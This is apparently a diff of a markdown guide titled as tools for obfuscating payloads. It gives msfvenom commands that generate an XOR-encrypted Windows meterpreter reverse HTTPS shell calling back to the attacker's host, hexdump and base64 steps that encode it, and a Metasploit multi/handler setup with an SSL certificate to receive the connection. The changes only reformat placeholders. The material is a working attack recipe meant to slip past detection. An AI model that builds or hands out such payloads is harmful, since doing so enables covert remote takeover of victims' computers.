@@ -6,17 +6,17 @@ Some Usefull tools and specific modus operanti to obfuscate payload
 ```sh
 msfvenom -p windows/x64/meterpreter_reverse_https LHOST=<OurIPADRESS> LPORT=443 --encrypt xor --encrypt-key <helloworld> --format raw > testf
 ```  
-helloworld are the key but we can write what we want.  
+<helloworld> are the key but we can write what we want.  
 
 ### Hex data dump
 
 ```sh
-hexdump -v -e '"\\""x" 1/1 "%02x" ""' testf
+hexdump -v -e '"\\""x" 1/1 "%02x" ""' <testf>
 ```  
 
 ### Convert data to Base64  
 ```sh
-base64 testf > newtest
+base64 <testf> > <newtest>
 ```
 
 ### Generate Key and certificate to obfuscate more seriously
@@ -54,7 +54,7 @@ msfconsole
 use exploit/multi/handler  
 set HandlerSSLCert </home/PATH/TO/THE/example.pem> (of the key we are generate earlier)  
 set StagerVerifySSLCert true  
-set LHOST ourIPADRESS  
+set LHOST <ourIPADRESS>  
 set LPORT 443  
 exploit
 ```  
